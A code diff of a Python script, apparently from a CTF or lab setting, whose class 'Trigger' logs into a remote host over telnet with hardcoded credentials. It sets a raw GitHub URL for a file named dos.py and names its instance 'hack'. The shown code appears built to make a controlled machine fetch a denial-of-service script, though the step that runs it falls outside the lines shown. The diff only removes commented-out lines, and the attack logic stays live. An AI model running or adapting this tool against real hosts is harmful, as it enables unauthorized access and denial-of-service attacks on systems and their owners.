@@ -5,11 +5,7 @@ class Trigger(object):
     def __init__(self):
         pass
 
-    #def login(self,Host,username=b'root',passwd=b'root'):
-    #def login(self,Host_attack,username=b'root',passwd=b'tee001'):
-    #def login(self,Host_attack,username,passwd):
     def login(self,Host,user_name,password):
-        #dev = telnetlib.Telnet(Host_attack,port=23)
         dev = telnetlib.Telnet(Host,port=23)
         dev.set_debuglevel(2) #Debug mode
 
@@ -46,7 +42,6 @@ class Trigger(object):
         telnetlib.Telnet.close(dev)
 
 if __name__ == '__main__':
-    #Host=b'192.168.59.146'
     Host_ctrled=b'153.0.0.181'
     username = b'ctf'
     passwd = b'test1234'
@@ -55,7 +50,6 @@ if __name__ == '__main__':
     user = b'ctf'
     pawd = b'ctff1234'
 
-    #path = b'https://github.com/bl201809/bllist/tree/master/20180907/dos.py'
     path = b'https://raw.githubusercontent.com/bl201809/bllist/master/dos/dos.py'
     hack = Trigger()
     dev = hack.login(Host_ctrled,username,passwd)
